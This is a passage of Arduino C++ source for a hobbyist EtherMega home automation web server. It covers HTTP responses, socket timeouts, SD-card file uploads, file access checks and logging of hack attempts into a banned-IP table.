        p_outside_hum = l_hum;
        Pop(c_proc_num);
        return true;
      }
    }
  }
  CheckRAM();
  Pop(c_proc_num);
  return false;
} //CalculateHeatResource
#endif

//----------------------------------------------------------------------------------------

void EthernetClientStop() {
  //Discards the HTMLParmList (not the cache)
  //This might be problematic because we geneally dump the HTMLParmList
  //when we clear the cache.
  const byte c_proc_num = 61;
  Push(c_proc_num);

  //Discard any residual html request lines
  //We should have processed the request OK down to the blank line
  //We should have processed an multi-part form data associated with a file upload
  //This will stop XSS hackers dumping data into the multi-part form area of an html request
  while (G_EthernetClient.available())
    G_EthernetClient.read();
  //

  G_EthernetClient.flush();
  G_EthernetClient.stop();
  //Clear the HTML Parm linked list just in case
  HTMLParmListDispose();
  G_EthernetClientActive = false;
  G_EthernetClientTimer = 0;

  CheckRAM();
  Pop(c_proc_num);
} //EthernetClientStop

//----------------------------------------------------------------------------------------

void SendHTMLResponse(const String &p_response, const String &p_content_type, boolean p_blank_line_terminate) {
  const byte c_proc_num = 62;
  Push(c_proc_num);

  //SPIDeviceSelect(DC_EthernetSSPin);
  G_EthernetClient.print(F("HTTP/1.1 "));

  G_EthernetClient.println(p_response);

  if (p_content_type == "")
    G_EthernetClient.println(F("Content-Type: text/html; charset=utf-8"));
  else {
    G_EthernetClient.print(F("Content-Type: "));
    G_EthernetClient.println(p_content_type); //jpeg image etc
  }
  G_EthernetClient.println(F("Cache-Control: no-cache"));
#ifdef D_2WGApp
  G_EthernetClient.println(F("Server: Catweazles Arduino EtherMega 2WG Home Automation System"));
#else
  G_EthernetClient.println(F("Server: Catweazles Arduino EtherMega GTM Monitoring System"));
#endif
  //We always close ethernet connections.
  //Our process is not multi-threaded so we cannot expect to hold
  //connections open waiting for additional html requests because that would
  //deny access to the system from other users comming in on other sockets.
  //For additional html requests the user will establish a new socket connection.
  G_EthernetClient.println(F("Connection: close"));  // the connection will be closed after completion of the response

  if (UserLoggedIn()) { //i.e. HTMLParmRead(E_COOKIE_232) != 0
    G_EthernetClient.print(F("Set-Cookie: "));
    G_EthernetClient.print(G_Website);
    G_EthernetClient.print(F("SID="));
    G_EthernetClient.print(HTMLParmRead(E_COOKIE_232));
    G_EthernetClient.print(F("; Path=/; Domain="));

    String l_host = HTMLParmRead(E_HOST_230);
    int l_posn = l_host.indexOf(":");
    //It seems that cookies are not port specific, only domain (site) specific
    //But we use different cookies across different applications
    if (l_posn != -1) {
      l_host = l_host.substring(0, l_posn); //Strip port
    }

    G_EthernetClient.println(l_host);
  };
  if (p_blank_line_terminate)
    G_EthernetClient.println(); //DO NOT REMOVE OR WEB PAGES WILL NOT DISPLAY - HEADERS MUST END WITH A BLANK LINE
  //

  CheckRAM();
  Pop(c_proc_num);
} //SendHTMLResponse

//----------------------------------------------------------------------------------------

void SendHTMLError(const String &p_response, const String &p_message) {
  //200 OK
  //401 Unauthorized
  //403 Forbidden
  //404 Not Found
  const byte c_proc_num = 63;
  Push(c_proc_num);

  HTMLParmDelete(E_COOKIE_232);
  SendHTMLResponse(p_response, "", true); //response, content_type, blank line terminate
  G_EthernetClient.println(F("<!DOCTYPE HTML>"));
  G_EthernetClient.println(F("<html><body>"));
  G_EthernetClient.println(F("<h1>Error Message From:</h1>"));
  G_EthernetClient.print(F("<h2>Catweazles "));
  G_EthernetClient.print(G_Website);
  G_EthernetClient.print(F(" Ethermega Monitoring System</h2>"));
  G_EthernetClient.println(F("<br>"));
  G_EthernetClient.println("<b>" + p_message + "</b>");
  G_EthernetClient.println(F("</body></html>"));

  CheckRAM();
  Pop(c_proc_num);
} //SendHTMLError

//----------------------------------------------------------------------------------------

void CheckSocketConnections() {
  const byte c_proc_num = 64;
  Push(c_proc_num);

  if (G_EthernetClientActive == true) {
    //Return if there is an active ethernet connection
    Pop(c_proc_num);
    return;
  }

  if (CheckSecondsDelay(G_SocketCheckTimer, C_OneMinute) == false) {
    //Return if one min not elapsed
    Pop(c_proc_num);
    return;
  }

  //Check the current status of the sockets
  for (uint8_t l_sock = 0; l_sock < MAX_SOCK_NUM; l_sock++) {
    uint8_t l_status = W5100.readSnSR(l_sock); //status
    if (l_status != 23) { //HEX 17 - Force timer reset
      G_SocketConnectionTimers[l_sock] = 0;
      G_SocketConnectionTimes[l_sock] = 0;
    }
    else if (G_SocketConnectionTimes[l_sock] == 0) {
      //If the socket timer is not active but it is currently connected
      //then we start the socket timer and record the current (start) time.
      G_SocketConnectionTimers[l_sock] = millis();
      G_SocketConnectionTimes[l_sock] = Now();
    }
  }

  //Now check to see if any connected sockets have been running for more than one minute
  boolean l_reset_reqd = false;
  unsigned long l_timer;
  for (uint8_t l_sock = 0; l_sock < MAX_SOCK_NUM; l_sock++) {
    l_timer = G_SocketConnectionTimers[l_sock];
    if ((G_SocketConnectionTimers[l_sock] != 0) && (CheckSecondsDelay(l_timer, C_OneMinute))) //l_timer reset to zero at timeout
      l_reset_reqd = true;
    //
  }

  //If there are any sockets that have been connected more than ten minutes
  //then we will force a disconnection
  if (l_reset_reqd == true) {
    //First list the socket status in the activity file (connection time will show)
    //ListSocketStatus();

    String l_line = "";
    l_line.reserve(50);
    //Now disconnect the sockets that have been connected more than one minute
    for (uint8_t l_sock = 0; l_sock < MAX_SOCK_NUM; l_sock++) {
      if ((G_SocketConnectionTimers[l_sock] != 0) &&
          (CheckSecondsDelay(G_SocketConnectionTimers[l_sock], C_OneMinute))) {
        W5100.execCmdSn(l_sock, Sock_DISCON);
        StatisticCount(St_Socket_Disconnections, false); //Don't exclude CWZ
        G_SocketConnectionTimers[l_sock] = 0; //already reset by CheckSecondsDelay
        G_SocketConnectionTimes[l_sock]  = 0;
        l_line = EPSR(E_Socket_Num__26) + String(l_sock);

        l_line += ", IP ";
        uint8_t dip[4];
        W5100.readSnDIPR(l_sock, dip); //IP Address
        for (int j = 0; j < 4; j++) {
          l_line += int(dip[j]);
          if (j < 3) l_line += ".";
        }
        l_line += EPSR(E__hy_Disconnected_292);
        ActivityWrite(l_line);

      } //disconnect current socket (timed out one mins)
    }  //iterate across each socket
  }  //socket connection resets reqd

  G_SocketCheckTimer = millis();
  CheckRAM();
  Pop(c_proc_num);
} //CheckSocketConnections

//----------------------------------------------------------------------------------------

String ExtractECLineMax(int p_length, boolean p_transform) {
  //We read html requests char by char because readStringUntil might pull out too
  //much data and cause a memory crash. An excessive long first line could be a hacker.
  //We restrict each line to p_length bytes.
  //We return content only - line feeds are ignored
  const byte c_proc_num = 73;
  Push(c_proc_num);

  String l_req_line = "";
  l_req_line.reserve(p_length + 1);
  char l_char;
  G_HTML_Req_EOL = false;
  for (byte l_count = 0; l_count < p_length; l_count++) {
    if (G_EthernetClient.available() == 0)
      break;
    //
    l_char = G_EthernetClient.read();
    if (l_char == '\n') { //return if line feed char found
      G_HTML_Req_EOL = true;
      break;
    }
    if (l_char != '\r') //ignore carriage return chars
      l_req_line += l_char;
    //
  }

  //We do not upshift and transform the URL line
  if (p_transform) {
    //Now check for XSS hacker keywords
    //If hacker keywords are found the input line is transformed
    //Also G_XSS_Hack_Flag is set
    String l_line_upper = l_req_line;
    l_line_upper.toUpperCase();
    //If any XSS transformation takes place we return an upshifted line
    if (WebSvrScriptXForm(l_line_upper))
      l_req_line = l_line_upper;
    //
  }

  CheckRAM();
  Pop(c_proc_num);
  return l_req_line;
} //ExtractECLineMax

//----------------------------------------------------------------------------------------

String GetPIRName(byte p_pir) {
  const byte c_proc_num = 93;
  Push(c_proc_num);
  String l_result = "";
#ifdef D_2WGApp
  if (p_pir == 0)
    l_result = EPSR(E_Bedroom_96);  //Int 0, Pin 2
  else if (p_pir == 1)
    l_result = EPSR(E_Lounge_95);   //Int 1, Pin 3
  else if (p_pir == 2)
    l_result = EPSR(E_Hallway_97);  //Int 2, Pin 21
  else if (p_pir == 3)
    l_result = EPSR(E_Garage_98);   //Int 3, Pin 20
  else if (p_pir == 4)
    l_result = EPSR(E_Patio_99);    //Int 4, Pin 19
  else
    l_result = EPSR(E_Bathroom_100); //Int 5, Pin 18
  //
#else
  if (p_pir == 0)
    l_result = EPSR(E_Office_237);  //Int 0, Pin 2
  //
#endif
  CheckRAM();
  Pop(c_proc_num);
  return l_result;
} //GetPIRName

//----------------------------------------------------------------------------------------

boolean MultiPartFormSearch(const String &p_search_term, String &p_line, unsigned long &p_length) {
  //Search for a specific string or the next non blank line
  const byte c_proc_num = 87;
  Push(c_proc_num);

  String l_line;
  p_line = "";
#ifdef UploadDebug
  Serial.println("- Search Term:" + p_search_term + "(" + String(p_search_term.length()) + ")");
#endif
  boolean l_result = false;
  while (G_EthernetClient.available()) {
    l_line = G_EthernetClient.readStringUntil('\n');
    l_line.replace("%2F", "/"); //Revert html forward slash encoding
    l_line.replace("\"", "'");  //Convert double to single quotes
#ifdef UploadDebug
    Serial.println("'" + l_line + "'");
#endif
    //Space should be included in the length
    p_length += l_line.length() + 1;
    l_line.toUpperCase();
    if ((p_search_term == "") && (l_line != "")) {
      p_line = l_line;
      l_result = true;
      break;
    }
    if (l_line.indexOf(p_search_term) >= 0) {
      p_line = l_line;
      l_result = true;
      break;
    }
  } //while
  CheckRAM();
  Pop(c_proc_num);
  return l_result;
} //MultiPartFormSearch

//----------------------------------------------------------------------------------------

boolean FileUploadProcess(String &p_filename, String &p_content_type, unsigned long &p_length, String &p_msg) {
  //The cache has been cleared
  //The file is in the unprocessed portion of the html request
  //We have extracted the boundary and content length
  //Content-Type: multipart/form-data; boundary=---------------------------197701018031364
  //Content-Length: 332
  //This is an example of what is left to process:
  //Note the final boundary has two extra "--"s on the end
  /*
    002
    046 -----------------------------197701018031364
    047 Content-Disposition: form-data; name="folder"
    007 other
    046 -----------------------------197701018031364
    084 Content-Disposition: form-data; name="file_name"; filename="Thai Chef Enquiry.txt"
    026 Content-Type: text/plain
    014 021 099 9999
    006 fred
    002
    002
    049 -----------------------------197701018031364--
    331
  */

  const byte c_proc_num = 86;
  Push(c_proc_num);

  String l_boundary = HTMLParmRead(E_BOUNDARY_233);
  l_boundary.trim();
  //We search in the data prefix in uppercase
  //(We want to process folder and filenames in uppercase)
  //We later search through the file content for the end boundary in original case
  l_boundary.toUpperCase();
  String l_line;
  p_msg = "";

  //Find the first boundary
  if (MultiPartFormSearch(l_boundary, l_line, p_length) == false) {
    p_msg = "1"; //"First Boundary";
    CheckRAM();
    Pop(c_proc_num);
    return false;
  }

  //Now extract the folder fieldname
  if (!MultiPartFormSearch(EPSR(E_NAMEeqqtFOLDERqt_293), l_line, p_length)) {
    p_msg = "2"; //"Folder Fieldname";
    CheckRAM();
    Pop(c_proc_num);
    return false;
  }

  //All going well the next line is the folder name
  //Folder should begin and end with a few slash /
  String l_folder;
  if (!MultiPartFormSearch("/", l_folder, p_length)) {
    p_msg = "3"; //"Folder Name";
    CheckRAM();
    Pop(c_proc_num);
    return false;
  }
  //HTMLWrite("- Folder Name: " + l_folder);
  l_folder.trim();
  SPIDeviceSelect(DC_SDCardSSPin);
  if (!SD.exists(&l_folder[0]))
    SD.mkdir(&l_folder[0]);
  //
  SPIDeviceSelect(DC_EthernetSSPin);

  //The next line should be a separation boundary
  if (!MultiPartFormSearch(l_boundary, l_line, p_length)) {
    p_msg = "4"; //"Separation Boundary";
    CheckRAM();
    Pop(c_proc_num);
    return false;
  }

  String l_filename;
  //We have found the upload file boundary - now extract the filename
  if (!MultiPartFormSearch(EPSR(E_FILENAMEeq_294), l_filename, p_length)) {
    p_msg = "5"; //"Filename Field";
    CheckRAM();
    Pop(c_proc_num);
    return false;
  }
  int l_pos = l_filename.indexOf(EPSR(E_FILENAMEeq_294)); //Must be OK
  l_filename = l_filename.substring(l_pos + 10);
  l_filename = l_filename.substring(0, l_filename.indexOf("'"));

  //Strip the filename to 8.3
  l_pos = 0;
  String l_file = ENDF2(l_filename, l_pos, '.');
  String l_ext  = ENDF2(l_filename, l_pos, '.');
  //First three chars max for file extension
  if (l_ext.length() > 3)
    l_ext = l_ext.substring(0, 3);
  //
  l_file.replace(' ', '_');  //Convert spaces to underscore
  //First eight chars max for filename
  if (l_file.length() > 8)
    l_file = l_file.substring(0, 8);
  //
  l_filename = l_folder + l_file + '.' + l_ext;

  SPIDeviceSelect(DC_SDCardSSPin);
  if (SD.exists(&l_filename[0])) {
    //If the file exists trim to 6 chars and add a suffix
    if (l_file.length() > 6)
      l_file = l_file.substring(0, 6);
    //
    l_file.trim(); //remove blanks embedded in the filename (posn 6)
    boolean l_ok = false;
    for (byte l_sfx = 0; l_sfx < 100; l_sfx++) {
      l_filename = l_folder + l_file + ZeroFill(l_sfx, 2) + '.' + l_ext;
      if (!SD.exists(&l_filename[0])) {
        l_ok = true;
        break;
      }
    } //check 100 numbered filenames
    if (l_ok == false) {
      p_msg = "6";// "Filename Error 100";
      CheckRAM();
      Pop(c_proc_num);
      return false;
    }
  }
  p_filename = l_filename;
  SPIDeviceSelect(DC_EthernetSSPin);

  //Now extract the content type
  String l_content_type;
  if (!MultiPartFormSearch(EPSR(E_CONTENThyTYPEco_266), l_content_type, p_length)) {
    p_msg = "7"; //"Content-Type:";
    CheckRAM();
    Pop(c_proc_num);
    return false;
  }
  l_pos = 0;
  ENDF2(l_content_type, l_pos, ':'); //Discard CONTENT-TYPE:
  p_content_type = l_content_type;

  //discard the blank line after content-type: and before the file data
  G_EthernetClient.readStringUntil('\n');
  p_length += 2;

  CheckRAM();
  Pop(c_proc_num);
  return true;
} //FileUploadProcess

//----------------------------------------------------------------------------------------

boolean BufferReadMax64(char p_buffer[], String &p_boundary, unsigned int &p_read_count, unsigned long &p_total_length, byte &p_new_byte_count) {
  //Read the next 64 bytes from the EthernetClient
  //Wait up to 10 seconds (when required) for more data to arrive in the buffer
  //Look for the boundary in our local buffer
  //Return false if after ten seconds there is no data (and the boundary is not found)
  const byte c_proc_num = 75;
  Push(c_proc_num);

  p_read_count++;
  boolean l_boundary_found = false;
  for (byte l_byte_count = 0; l_byte_count < 64; l_byte_count++) {
    if (G_EthernetClient.available() == 0) {
      //Wait up to ten seconds for the next block of characters to arrive
      //Chunky data uploads seem to be the norm
#ifdef UploadDebug
      //Show the point in the data stream where we are waiting for data
      Serial.print(p_total_length + l_byte_count);
      unsigned long l_start2 = millis();
#endif
      unsigned long l_start = millis();
      while (CheckSecondsDelay(l_start, C_OneSecond * 10) == false) {
        //No need to wait if boundary found
        int l_offset;
        if (p_read_count > 1)
          l_offset = 64; //go back to start off base offset
        else
          l_offset = 0; //we are loading from start of the base offset
        //
        if (BoundaryFound(p_buffer - l_offset, l_offset + l_byte_count, p_boundary)) {
          l_boundary_found = true;
          break;
        }
        if (G_EthernetClient.available() != 0)
          break;
        //
      } //loop until data arrives/break if boundary found
#ifdef UploadDebug
      //show the time delay
      Serial.print('(');
      Serial.print(millis() - l_start2);
      Serial.println(')');
#endif
      //If still no data after ten seconds and no boundary found
      //we assume a timeout and terminate the process.
      if (G_EthernetClient.available() == 0) {
        p_new_byte_count = l_byte_count;
        CheckRAM();
        Pop(c_proc_num);
        return l_boundary_found;
      }
    } //No data - may be end
    p_buffer[l_byte_count] = G_EthernetClient.read();
  } //loop to extract 64 bytes
  p_new_byte_count = 64;
  CheckRAM();
  Pop(c_proc_num);
  return true;
} //BufferReadMax64

//----------------------------------------------------------------------------------------

char *BoundaryFound(char *p_buffer, const int &p_buffer_length, String &p_boundary) {
  const byte c_proc_num = 85;
  Push(c_proc_num);
  //Look for the boundary in the buffer

  //Skip through the buffer looking for the first char of the boundary
  int l_offset = 0;
  while (true) {
    //Find an instance of the first character of the boundary in the buffer
    //void *memchr(const void *ptr, int ch, size_t len)
    char *l_start = (char*)memchr(p_buffer + l_offset, p_boundary[0], p_buffer_length - l_offset);
    if (!l_start) {
      CheckRAM();
      Pop(c_proc_num);
      return NULL;
    }

    //calculate buffer search length from start posn to end of buffer
    int l_length = int(p_buffer) + p_buffer_length - (int)l_start;
    //if not enough space for the boundary then return
    if (l_length < p_boundary.length()) {
      CheckRAM();
      Pop(c_proc_num);
      return NULL;
    }

    //Now test if we have found the full boundary
    //int memcmp(const void *ptr1, const void *ptr2, size_t len) (ZERO IF SAME)
    if (memcmp(l_start, &p_boundary[0], p_boundary.length()) == 0) {
      CheckRAM();
      Pop(c_proc_num);
      return l_start;
    }

    //boundary not found - reset offset and search forward
    l_offset = int(l_start) - int(p_buffer) + 1;
  } //skip through the buffer looking for the boundary start char
  CheckRAM();
  Pop(c_proc_num);
  return NULL;
} //char *BoundaryFound(char *p_buffer, const int &p_buffer_length, const String &p_boundary) {

//----------------------------------------------------------------------------------------

boolean SaveUploadFileStream(String &p_filename, String &p_end_boundary, unsigned long &p_length) {
  const byte c_proc_num = 76;
  Push(c_proc_num);

#ifdef D_2WGApp
  const int c_buffer_size = 256;
#else
  const int c_buffer_size = 512;
#endif
  CheckRAM();

  uint8_t l_buffer[c_buffer_size];
  //p_length is the data read so far
  unsigned long l_file_length = HTMLParmRead(E_LENGTH_234).toInt() - p_length - p_end_boundary.length() - 4; //-4 for CR/LF before and after end boundary;
  SPIDeviceSelect(DC_SDCardSSPin);
  File l_file = SD.open(&p_filename[0], FILE_WRITE);
  SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)
  boolean l_result = true;

  unsigned long l_data_length = l_file_length;
  int l_buffer_request;
  int l_buffer_count;
  unsigned long l_timeout_timer;
  //G_EthernetClient.setTimeout(100); //100ms - Default is one second
  SOCKET l_socket = G_EthernetClient.getSocketNum();
#ifdef UploadDebug
  unsigned long l_start_time = millis();
  unsigned long l_total_sd_time = 0;
  unsigned long l_total_wait_time = 0;
  unsigned long l_sd_time = 0;
  unsigned long l_wait_time = 0;
#endif
  //Iterate until we have downloaded all the file count
  //OR we have detected a ten second timeout.
  while (l_data_length > 0) {
    if (l_data_length > c_buffer_size)
      l_buffer_request = c_buffer_size;
    else
      l_buffer_request = l_data_length;
    //
    //l_buffer_count = G_EthernetClient.readBytes(l_buffer, l_buffer_request);
    l_buffer_count = recv(l_socket, l_buffer, l_buffer_request);

    if (l_buffer_count > 0) {
      //We have got some data
      l_timeout_timer = 0; //JIC
#ifdef UploadDebug
      if (l_wait_time != 0) {
        //Show the wait time
        Serial.print(" (");
        Serial.print(millis() - l_wait_time);
        Serial.println(')');
        //Update the total wait time
        l_total_wait_time += (millis() - l_wait_time);
        l_wait_time = 0;
      }
      l_sd_time = millis();
#endif
      //Write the retrieved buffer data to the SD card
      SPIDeviceSelect(DC_SDCardSSPin);
      l_file.write((uint8_t*)l_buffer, l_buffer_count);
      SPIDeviceSelect(DC_EthernetSSPin);
      l_data_length -= l_buffer_count;
      l_buffer_count = 0;
#ifdef UploadDebug
      l_total_sd_time += (millis() - l_sd_time);
#endif
    }
    else if (l_timeout_timer == 0) {
      //No data retrieved - start timers
#ifdef UploadDebug
      Serial.print(l_data_length);
      l_wait_time = millis();
#endif
      l_timeout_timer = millis();
      //Display data progress point
    }
    else if (CheckSecondsDelay(l_timeout_timer, C_OneSecond * 10) == true) {
      //No data retrieved - timeout has occurred
      l_result = false;
      break;
    }
  } //read file content until done
#ifdef UploadDebug
  if (l_wait_time != 0) {
    //Show the wait time
    Serial.print(' (');
    Serial.print(millis() - l_wait_time);
    Serial.println(')');
    //Update the total wait time
    l_total_wait_time += (millis() - l_wait_time);
    l_wait_time = 0;
  }
  //Display load time statistics
  Serial.print(F("TOTAL LOAD TIME: "));
  Serial.println(float(millis() - l_start_time) / 1000, 2);
  Serial.print(F("ETHERNET READ TIME: "));
  Serial.println(float((millis() - l_start_time) - l_total_wait_time - l_total_sd_time) / 1000, 2);
  Serial.print(F("SD WRITE TIME: "));
  Serial.println(float(l_total_sd_time / 1000), 2);
  Serial.print(F("DATA WAIT TIME: "));
  Serial.println(float(l_total_wait_time) / 1000, 2);
#endif
  SPIDeviceSelect(DC_SDCardSSPin);
  l_file.close();
  SPIDeviceSelect(DC_EthernetSSPin);

  //Check the boundary
  if (l_result == true) {
#ifdef UploadDebug
    Serial.println(F("Skip Boundary CR/LF Prefix"));
#endif
    p_length += l_file_length;
    //Discard CR/LF before boundary
    l_timeout_timer = millis();
    for (l_buffer_count = 0; l_buffer_count < 2; l_buffer_count++) {
      if (G_EthernetClient.available() != 0)
        G_EthernetClient.read();
      //
      if (CheckSecondsDelay(l_timeout_timer, C_OneSecond * 10) == true) {
        l_result = false;
        break;
      }
    } //Discard CR/LF before boundary

    //Load boundary into buffer
    if (l_result == true) {
#ifdef UploadDebug
      Serial.println(F("Load End Boundary"));
#endif
      p_length += 2;
      for (l_buffer_count = 0; l_buffer_count < p_end_boundary.length(); l_buffer_count++) {
        if (G_EthernetClient.available() != 0)
          l_buffer[l_buffer_count] = G_EthernetClient.read();
        //
        if (CheckSecondsDelay(l_timeout_timer, C_OneSecond * 10) == true) {
          l_result = false;
          break;
        }
      } //load length of boundary bytes
    } //Load boundary into buffer

    //Verify the boundary
    if (l_result == true) {
#ifdef UploadDebug
      Serial.println(F("Verify End Boundary"));
#endif
      if (memcmp(l_buffer, &p_end_boundary[0], p_end_boundary.length()) != 0) {
        l_result = false;
#ifdef UploadDebug
        Serial.println(F("End Boundary Not Found!"));
#endif
      }
      else {
#ifdef UploadDebug
        Serial.println(F("End Boundary Found OK"));
#endif
      }
      //Allow two more bytes for the CR/LF after the boundary
      p_length += p_end_boundary.length() + 2;
      //Discard trailing data - should be two bytes for CR/LF
      while (G_EthernetClient.available() != 0)
        G_EthernetClient.read();
      //
    } //Verify the boundary
  } //Check the boundary

  if (l_result == false)
    SD.remove(&p_filename[0]);
  //
  CheckRAM();
  Pop(c_proc_num);
  return l_result;
} //SaveUploadFileStream

//----------------------------------------------------------------------------------------

boolean CheckFileAccessSecurity(const String &p_filename) {
  //p_filename includes the folder (directory)
  const byte c_proc_num = 83;
  Push(c_proc_num);
  boolean l_result = false; //D
  if (p_filename != "") { //Not a null file
    if ((UserLoggedIn()) ||            //Logged
        (LocalIP(G_RemoteIPAddress)))  //Local user
      l_result = true;
    //Hopefully individual EPSR evaluations with minimise SRAM requirements
    //We also evaluate in decreasing String size - does this minimise heap fragmentation?
    else if (p_filename.indexOf(EPSR(E_ROBOTSdtTXT_250)) != -1)  //Anyone can view the robots.txt file
      l_result = true;
    else if (p_filename.indexOf(EPSR(E_HACKLOGSsl_144)) != -1)   //Public folder
      l_result = true;
    else if (p_filename.indexOf(EPSR(E_SCRNINFOsl_308)) != -1)   //Public folder
      l_result = true;
    else if (p_filename.indexOf(EPSR(E_PUBLICsl_305)) != -1)     //Public folder
      l_result = true;
    else if (p_filename.indexOf(EPSR(E_IMAGESsl_306)) != -1)     //Public folder
      l_result = true;
    //
  }
  CheckRAM();
  Pop(c_proc_num);
  return l_result;
} //CheckFileAccessSecurity

//----------------------------------------------------------------------------------------

void ProcInvalidFileAccessAttempt() {
  const byte c_proc_num = 84;
  Push(c_proc_num);

  ProcessHackAttempt(EPSR(E_INVALID_FILE_ACCESS_ATTEMPT_246), "FLE", St_Direct_File_Hacks);

  CheckRAM();
  Pop(c_proc_num);
} //ProcInvalidFileAccessAttempt

//----------------------------------------------------------------------------------------

void ResetStatisticsCounts(boolean p_clear_month) {
  //Called with p_clear_month = true at statup and midnight at change of month.
  //Called with p_clear_month = false at midnight every day except change of month.
  const byte c_proc_num = 92;
  Push(c_proc_num);

  for (int l_index = 0; l_index < DC_StatisticsCount; l_index ++) {
    if (p_clear_month)
      G_StatActvMth[l_index] = 0;
    //
    G_StatActvDay[l_index] = 0;
  }

  for (int l_index = 0; l_index < G_CrawlerCount; l_index ++) {
    if (p_clear_month)
      G_StatCrwlMth[l_index] = 0;
    //
    G_StatCrwlDay[l_index] = 0;
  }

  CheckRAM();
  Pop(c_proc_num);
} //ResetStatisticsCounts

//----------------------------------------------------------------------------------------

void ProcessInvalidWebPageRequest() {
  const byte c_proc_num = 89;
  Push(c_proc_num);

  ProcessHackAttempt(EPSR(E_Bad_Page_Number_228), "PGE", St_Other_Hacks); //Considered a hacker (may be a web crawler with an old page number)

  CheckRAM();
  Pop(c_proc_num);
} //ProcessInvalidWebPageRequest()

//----------------------------------------------------------------------------------------

boolean UserLoggedIn() {
  const byte c_proc_num = 149;
  Push(c_proc_num);
  boolean l_result;
  if (HTMLParmRead(E_COOKIE_232).toInt() != 0)
    l_result = true;
  else
    l_result = false;
  //
  CheckRAM();
  Pop(c_proc_num);
  return l_result;
} //UserLoggedIn()

//----------------------------------------------------------------------------------------

void ProcessHackAttempt(const String &p_head, const String &p_ban_type, int p_statistic_type) {
  const byte c_proc_num = 12;
  Push(c_proc_num);

  //This will push all HTML log file data into the hack log
  G_Hack_Flag = true;
  StatisticCount(p_statistic_type, true); //Exclude CWZ

  if ((p_ban_type != "BIN") &&
      (p_ban_type != "RFL")) {
    //We do not add binary (hex) html requests into the failed html request table
    //We do not add random file html requests into the failed html request table
    //where the user has not recently browsed the web site.
    //We do not send them the ErrorWebPage - we just ignore these requests
    //However they are written to the hacker log.

    //p_ban_type will be NULL when this is a preprocessed banned IP address
    //and in this case it is not added to the failed IP address table
    //But we make the call to get l_ip_address so we can check if the error web page is required
    int l_ip_address = UpdateBannedIPAddressTable(G_RemoteIPAddress, p_ban_type);
    if (G_FailedHTMLRequestList[l_ip_address].AttemptCount < 6) {
      ErrorWebPage();
    }
  }

  EthernetClientStop(); //Discards the HTMLParmList (not the cache)

  HTMLWrite("- " + p_head);

  CheckRAM();
  Pop(c_proc_num);
} //ProcessHackAttempt

//----------------------------------------------------------------------------------------

int UpdateBannedIPAddressTable(byte p_ip_address[], const String &p_ban_type) {
  //Search the hack list and update the count if p_ban_type != ""
  //Insert new hacker record if necessary
  //Return the index of the record so we can check Attempt Count
  const byte c_proc_num = 94;
  Push(c_proc_num);
  int l_null_record = -1;
  int l_delete_record = -1;
  int l_delete_score = 1000; //D
  int l_record_score = 0; //D

  //Now look for any existing hack record for this IP address
  for (byte l_index = 0; l_index < DC_FailedHTMLRequestListCount; l_index++) {
    boolean l_found = true;
    for (byte l_idx = 0; l_idx < DC_IPAddressFieldCount; l_idx++) {
      if ((G_FailedHTMLRequestList[l_index].IPAddress[l_idx] != p_ip_address[l_idx]) &&
          ((l_idx < 3) ||
           (G_FailedHTMLRequestList[l_index].IPAddress[l_idx] != 0))) {
        l_found = false;
        break;
      }
    }
    if (l_found) {
      if (p_ban_type != "") {
        //Just update counts for this new hack and return
        //The calling procedure deals with further hack processing
        if (G_FailedHTMLRequestList[l_index].AttemptCount == 255)
          G_FailedHTMLRequestList[l_index].AttemptCount = 3; //byte rollover to three
        else
          G_FailedHTMLRequestList[l_index].AttemptCount++;
        //
        G_FailedHTMLRequestList[l_index].LastDateTime = Now();  //resets the timer
        //We record the latest ban type, not the original
        p_ban_type.toCharArray(G_FailedHTMLRequestList[l_index].BanType, 4); //+1 for \0
      }
      CheckRAM();
      Pop(c_proc_num);
      return l_index;
    }

    //This list record has not matched the current IP address.
    //Can we use this record as a null for insertion later
    //or is it in any case the oldest record that we might delete and re-use.
    if (l_null_record == -1) {
      boolean l_null = true;
      for (byte l_idx = 0; l_idx < DC_IPAddressFieldCount; l_idx++) {
        if (G_FailedHTMLRequestList[l_index].IPAddress[l_idx] != 0) {
          l_null = false;
          break;
        }
      }
      if (l_null == true)
        //Capture the posn of the first null record for a possible insert later
        //(No update to l_delete_score)
        l_null_record = l_index;
      else {
        l_record_score = int((float(G_FailedHTMLRequestList[l_index].LastDateTime) - Now()) * 24 / 100000); //hours (-ve)
        l_record_score += (G_FailedHTMLRequestList[l_index].AttemptCount * 2); //adjust for twice the hack count
        if (l_delete_record == -1) { //take the first non null record as the oldest
          l_delete_record = l_index;
          l_delete_score  = l_record_score;
        }
        else if (l_record_score < l_delete_score) {
          //Record the lowest score record as the one to delete
          //and be replaced.
          l_delete_record = l_index;
          l_delete_score  = l_record_score;
        }
      }
    } //find first null
  } //check each hack record against this http request IP address

  //If we get here then the IP address was not found in the hacker list.
  //We do not envisage p_ban_type = "";
  //We have also pre-determined where to insert the new hack record.
  //(If the first blank record or overwrite the oldest hack record)
  //If this is not a known hacker we can simply return

  //Insert new hack record at first null position (or oldest record if no null record)
  if (l_null_record == -1) //Use oldest record which releases that one from the blacklist
    l_null_record = l_delete_record;
  //
  for (byte l_idx = 0; l_idx < DC_IPAddressFieldCount; l_idx++)
    G_FailedHTMLRequestList[l_null_record].IPAddress[l_idx] = p_ip_address[l_idx];
  //
  p_ban_type.toCharArray(G_FailedHTMLRequestList[l_null_record].BanType, 4); //+1 for \0
  if (p_ban_type == "XXX") //Manual immediate ban
    G_FailedHTMLRequestList[l_null_record].AttemptCount = 6;
  else
    G_FailedHTMLRequestList[l_null_record].AttemptCount = 1;
  //
  G_FailedHTMLRequestList[l_null_record].LastDateTime = Now();
  CheckRAM();
  Pop(c_proc_num);
  return l_null_record;
} //UpdateBannedIPAddressTable

//----------------------------------------------------------------------------------------

void WriteInitialHTMLLogData(const String &p_req_line) {
  const byte c_proc_num = 146;
  Push(c_proc_num);
  HTMLWrite(EPSR(E_asas_HTML_REQUEST_asas_309));
  HTMLWrite(EPSR(E_hy_Browser_IPco__295) + G_EthernetClient.getRemoteIPString());
  HTMLWrite(EPSR(E_Socket_Num_222) + String(G_EthernetClient.getSocketNum()));
  HTMLWrite(EPSR(E_Dest_Port_223) + String(G_EthernetClient.getDestPort()));
  HTMLWrite("- " + p_req_line);
  CheckRAM();
  Pop(c_proc_num);
} //WriteInitialHTMLLogData

//----------------------------------------------------------------------------------------

void ProcessWebPageIPAddress() {
  //We delete an IP Address from the Banned IP Address table
  //or we add an address to the Banned IP Address table.
  //This is used where we entered an IP address on the Hacker Activity Form

  const byte c_proc_num = 95;
  Push(c_proc_num);

  //Pull the value out of the Parms list table
